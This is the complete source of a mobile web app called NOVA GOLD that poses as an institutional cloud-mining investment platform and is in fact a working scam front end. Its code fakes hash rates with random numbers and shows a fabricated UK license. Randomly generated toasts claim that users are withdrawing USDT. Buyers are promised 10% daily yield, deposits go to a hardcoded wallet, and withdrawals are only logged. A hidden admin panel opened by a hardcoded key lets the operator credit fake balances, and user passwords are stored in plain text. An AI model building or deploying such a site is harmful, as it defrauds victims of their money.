<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA GOLD | Institutional Cloud Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0f172a; --accent: #4ade80; }
        body { background: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; touch-action: manipulation; }
        .nova-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.02); overflow: hidden; }
        .dark-card { background: var(--dark); color: white; border-radius: 28px; position: relative; overflow: hidden; border-bottom: 8px solid var(--gold); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 16px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
        .btn-gold:active { transform: scale(0.96); }
        .screen { display: none; animation: fadeIn 0.4s ease-out; padding-bottom: 120px; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 16px; border-radius: 14px; outline: none; margin-bottom: 12px; font-weight: 600; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 2000; padding: 25px; overflow-y: auto; }
        #trust-toast { position: fixed; bottom: 95px; left: 15px; right: 15px; background: var(--dark); color: white; padding: 15px; border-radius: 18px; display: none; z-index: 3000; border-left: 6px solid var(--gold); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .hash-glow { color: var(--accent); text-shadow: 0 0 12px rgba(74, 222, 128, 0.4); font-family: monospace; }
        .support-btn { position: fixed; bottom: 100px; right: 20px; width: 55px; height: 55px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; box-shadow: 0 10px 20px rgba(212, 175, 55, 0.3); z-index: 900; animation: bounce 3s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
    </style>
</head>
<body>

    <div id="trust-toast">
        <div class="flex items-center gap-4">
            <div class="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center"><i class="fa-solid fa-check text-green-500"></i></div>
            <div><p id="t-user" class="font-black text-[10px] uppercase"></p><p id="t-msg" class="text-slate-400 text-[9px]"></p></div>
        </div>
    </div>

    <div class="support-btn" onclick="alert('Live support connecting...')"><i class="fa-solid fa-headset text-xl"></i></div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="text-center mb-12">
            <h1 id="logo-tap" class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[6px] mt-3">Quantum Mining Infrastructure</p>
        </div>
        <div class="space-y-3">
            <input type="text" id="u-id" placeholder="Partner Identifier" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <div id="adm-box" class="hidden"><input type="password" id="adm-key" placeholder="System Master Key" class="p-input border-yellow-500 shadow-inner"></div>
            <button onclick="handleAuth()" class="w-full btn-gold py-5 shadow-xl shadow-yellow-600/20">Secure Initialize</button>
            <p onclick="toggleMode()" id="mode-text" class="text-center text-[10px] mt-10 text-slate-500 font-bold uppercase cursor-pointer tracking-widest">Register Enterprise Node</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-50">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-3">
                <span id="user-tag" class="text-[8px] font-black bg-slate-900 text-white px-4 py-1.5 rounded-full tracking-widest uppercase">@Partner</span>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300 text-lg"></i>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="dark-card p-8 mb-6 shadow-2xl">
                <div class="absolute top-0 right-0 p-4 flex gap-2 items-center">
                    <span class="text-[8px] font-black text-slate-500">NODES: ONLINE</span>
                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                </div>
                <div class="relative z-10 text-center">
                    <div class="hash-glow text-[10px] font-bold mb-5 tracking-[4px] uppercase">Hash: <span id="hash-val">450.25</span> TH/s</div>
                    <p class="text-[9px] text-slate-400 font-black uppercase tracking-[5px] mb-3">Total Liquidity</p>
                    <h1 id="b-main" class="text-6xl font-black tracking-tighter mb-10">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                        <div class="text-left"><p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Daily Yield</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Net Profit</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div onclick="openModal('modal-legal')" class="nova-card p-5 mb-6 flex justify-between items-center border-l-4 border-blue-500 cursor-pointer">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center text-blue-600"><i class="fa-solid fa-file-shield"></i></div>
                    <div><h4 class="text-xs font-black uppercase tracking-tighter">Corporate License</h4><p class="text-[9px] text-slate-400 font-bold">UK Registered & Verified</p></div>
                </div>
                <i class="fa-solid fa-chevron-right text-slate-300"></i>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('modal-dep')" class="nova-card p-6 flex flex-col items-center gap-3 active:bg-slate-50"><i class="fa-solid fa-plus-circle text-3xl text-[#D4AF37]"></i><span class="text-[10px] font-black uppercase tracking-widest">Deposit</span></button>
                <button onclick="openModal('modal-wd')" class="nova-card p-6 flex flex-col items-center gap-3 active:bg-slate-50"><i class="fa-solid fa-arrow-up-from-bracket text-3xl text-slate-400"></i><span class="text-[10px] font-black uppercase tracking-widest">Withdraw</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Nodes</span></h2>
            <div id="nodes-grid" class="space-y-4 pb-10"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Blockchain <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="logs-list" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-gauge-high text-xl"></i><span>CORE</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-list-check text-xl"></i><span>LOGS</span></div>
        </nav>
    </div>

    <div id="modal-legal" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">LEGAL LICENSE</h2><i onclick="closeModal('modal-legal')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="nova-card p-8 text-center border-8 border-double border-slate-100">
            <h1 class="text-3xl font-black text-slate-800 mb-2">NOVA CORE</h1>
            <p class="text-[8px] font-bold uppercase tracking-[5px] text-slate-400 mb-6">Certified Mining Operator</p>
            <div class="space-y-4 text-left border-y py-6 my-6 border-slate-100 font-bold text-[10px]">
                <p><span class="text-slate-400">REG NO:</span> UK-99201-NOVA</p>
                <p><span class="text-slate-400">ENTITY:</span> NOVA INFRASTRUCTURE LTD</p>
                <p><span class="text-slate-400">STATUS:</span> ACTIVE / VERIFIED</p>
            </div>
            <img src="https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=NOVA_CERTIFIED" class="mx-auto w-24 h-24 opacity-40">
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-slate-50 z-[5000] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h1 class="text-3xl font-black">MASTER ADMIN</h1><button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl font-bold">CLOSE</button></div>
        <div class="nova-card p-6">
            <h4 class="text-xs font-black uppercase mb-4 text-slate-400">Liquidity Injection</h4>
            <input type="text" id="adm-target" placeholder="Target User ID" class="p-input">
            <input type="number" id="adm-val" placeholder="Amount to Add" class="p-input">
            <button onclick="injectFunds()" class="w-full btn-gold py-4 bg-slate-900">Inject Now</button>
        </div>
    </div>

    <div id="modal-dep" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">FUNDING</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark"></i></div>
        <div class="nova-card p-6 bg-slate-900 text-[#D4AF37] font-mono text-[10px] text-center break-all mb-8">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</div>
        <input type="number" id="in-amt" placeholder="Amount (USDT)" class="p-input">
        <input type="text" id="in-ref" placeholder="Blockchain TxID" class="p-input">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-5 shadow-lg">Confirm Deposit</button>
    </div>

    <div id="modal-wd" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">WITHDRAWAL</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark"></i></div>
        <input type="number" id="out-amt" placeholder="Amount to Extract" class="p-input">
        <input type="text" id="out-addr" placeholder="Your USDT Address" class="p-input">
        <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-5 bg-slate-900">Process Payout</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let isLogin = true;

        if(user) startApp(user);

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "NOVA786") { openAdmin(); return; }
            if(!id || !pw) return alert("Required fields missing");

            const uR = doc(db, "users", id); const s = await getDoc(uR);
            if(!isLogin) {
                if(s.exists()) return alert("User already registered");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0 });
                localStorage.setItem('nova_user', id); startApp(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); startApp(id);
            } else alert("Invalid credentials");
        };

        function startApp(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
            
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                if(data) {
                    document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                    document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                    document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                }
            });
            genNodes(); loadLogs(); runHash(); setInterval(showToast, 18000);
        }

        function genNodes() {
            const c = document.getElementById('nodes-grid'); c.innerHTML = "";
            for(let i=1; i<=32; i++) {
                const cost = i * 40; const yield_val = (cost * 0.1).toFixed(2);
                c.innerHTML += `
                <div class="nova-card">
                    <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400&auto=format" class="w-full h-32 object-cover opacity-80">
                    <div class="p-5 flex justify-between items-center">
                        <div><h4 class="text-[10px] font-black uppercase">Unit X-G${i} Core</h4><p class="text-green-500 font-bold text-[9px]">+$${yield_val}/Day Yield</p></div>
                        <button onclick="buyNode(${cost}, ${yield_val})" class="btn-gold px-6 py-2 shadow-md">$${cost}</button>
                    </div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Liquidity Error: Low Funds");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Hardware Successfully Integrated!");
        };

        window.submitFin = async (type) => {
            const a = parseFloat(document.getElementById(type=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(type=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Data missing");
            await addDoc(collection(db, "logs"), { user, type, amount: a, status: 'Processing', time: Date.now(), ref: r });
            alert("Broadcasted to blockchain network!"); closeModal(type=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadLogs() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user)), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                let entries = []; s.forEach(d => entries.push(d.data()));
                entries.sort((a,b) => b.time - a.time).forEach(l => {
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between items-center">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase tracking-widest">${l.type}</p><p class="text-xs font-bold">$${l.amount.toFixed(2)}</p></div>
                        <span class="text-[9px] font-black uppercase px-3 py-1 rounded-full ${l.status=='Success'?'bg-green-50 text-green-500':'bg-yellow-50 text-yellow-600'}">${l.status}</span>
                    </div>`;
                });
            });
        }

        function runHash() { setInterval(() => { document.getElementById('hash-val').innerText = (450 + Math.random() * 5).toFixed(2); }, 3000); }

        function showToast() {
            const names = ["Zain", "Sara", "Ali", "Fatima", "Umer", "Khan", "Malik", "Irfan"];
            const u = names[Math.floor(Math.random()*names.length)];
            const val = (Math.random()*450 + 20).toFixed(2);
            document.getElementById('t-user').innerText = `Partner @${u}***`;
            document.getElementById('t-msg').innerText = `Successfully extracted $${val} USDT`;
            const t = document.getElementById('trust-toast'); t.style.display='block';
            setTimeout(()=> t.style.display='none', 4500);
        }

        let taps = 0;
        document.getElementById('logo-tap').onclick = () => { taps++; if(taps >= 6) document.getElementById('adm-box').classList.remove('hidden'); };
        window.openAdmin = () => document.getElementById('admin-panel').classList.remove('hidden');
        window.closeAdmin = () => { document.getElementById('admin-panel').classList.add('hidden'); taps=0; document.getElementById('adm-box').classList.add('hidden'); };
        window.injectFunds = async () => {
            const t = document.getElementById('adm-target').value.toLowerCase().trim();
            const v = parseFloat(document.getElementById('adm-val').value);
            const uR = doc(db, "users", t); const s = await getDoc(uR);
            if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + v }); alert("Liquidity Injected!"); }
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };
        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "Register Enterprise Node" : "Existing Partner (Login)"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
    </script>
</body>
</html>
